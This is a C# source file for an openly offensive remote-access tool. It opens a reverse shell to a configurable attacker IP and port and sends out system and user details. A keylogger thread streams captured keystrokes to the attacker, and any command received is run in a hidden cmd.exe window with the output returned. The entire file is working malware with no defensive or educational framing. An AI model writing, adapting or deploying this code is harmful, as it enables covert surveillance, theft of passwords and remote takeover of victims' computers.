using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

class ReverseShell
{
    static string GetSystemInfo()
    {
        string info = "[SYSTEM INFO]\n";
        info += $"OS: {Environment.OSVersion}\n";
        info += $"Machine Name: {Environment.MachineName}\n";
        info += $"User Name: {Environment.UserName}\n";
        info += $"CPU: {GetHardwareInfo("Win32_Processor", "Name")}\n";
        info += $"RAM: {GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory")} bytes\n";
        return info;
    }

    static string ConvertKey(int keyCode)
    {
        if (keyCode == 160 || keyCode == 161 || keyCode == 162 || keyCode == 163 || keyCode == 164)
        {
            return string.Empty; 
        }

        switch (keyCode)
        {
            case 8: return "[BACKSPACE]";
            case 9: return "[TAB]";
            case 13: return "[ENTER]";
            case 27: return "[ESC]";
            case 32: return " ";
            case 37: return "[LEFT]";
            case 38: return "[UP]";
            case 39: return "[RIGHT]";
            case 40: return "[DOWN]";
            default:
                if (keyCode >= 65 && keyCode <= 90)
                {
                    return ((char)keyCode).ToString().ToLower(); 
                }
                else if (keyCode >= 48 && keyCode <= 57) 
                {
                    return ((char)keyCode).ToString();
                }
                else if (keyCode >= 96 && keyCode <= 105) 
                {
                    return ((char)(keyCode - 48)).ToString();
                }
                else
                {
                    return string.Empty; 
                }
        }
    }


    static string GetHardwareInfo(string hwclass, string syntax)
    {
        ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {syntax} FROM {hwclass}");
        foreach (ManagementObject obj in searcher.Get())
        {
            return obj[syntax]?.ToString() ?? "Unknown";
        }
        return "Unknown";
    }

    static void Keylogger(StreamWriter writer)
    {
        StringBuilder logBuffer = new StringBuilder();

        while (true)
        {
            Thread.Sleep(50); 
            for (int i = 0; i < 255; i++) 
            {
                if (GetAsyncKeyState(i) == -32767) 
                {
                    string key = ConvertKey(i);

                    if (!string.IsNullOrEmpty(key))
                    {
                        logBuffer.Append(key);

                        //Console.WriteLine($"Key Pressed: {key} (Key Code: {i})");

                        if (key == "[ENTER]")
                        {
                            if (logBuffer.Length > 0)
                            {
                                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {logBuffer.ToString()}";
                                writer.WriteLine("[KEYLOG] " + logEntry);
                                writer.Flush();
                                //Console.WriteLine($"Log Sent: {logEntry}"); 
                                logBuffer.Clear(); 
                            }
                        }
                    }
                }
            }
        }
    }


    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);

    static void Main()
    {
        string attackerIP = "127.0.0.1";
        int attackerPort = 4444;
        
        try
        {
            using (TcpClient client = new TcpClient(attackerIP, attackerPort))
            using (NetworkStream stream = client.GetStream())
            using (StreamReader reader = new StreamReader(stream))
            using (StreamWriter writer = new StreamWriter(stream))
            {
                writer.AutoFlush = true;
                writer.WriteLine(GetSystemInfo());
                Thread keyloggerThread = new Thread(() => Keylogger(writer));
                keyloggerThread.Start();
                
                while (true)
                {
                    string command = reader.ReadLine();
                    if (command.ToLower() == "exit") break;
                    
                    Process proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.Arguments = "/c " + command;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;
                    proc.Start();
                    
                    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                    writer.WriteLine(output);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
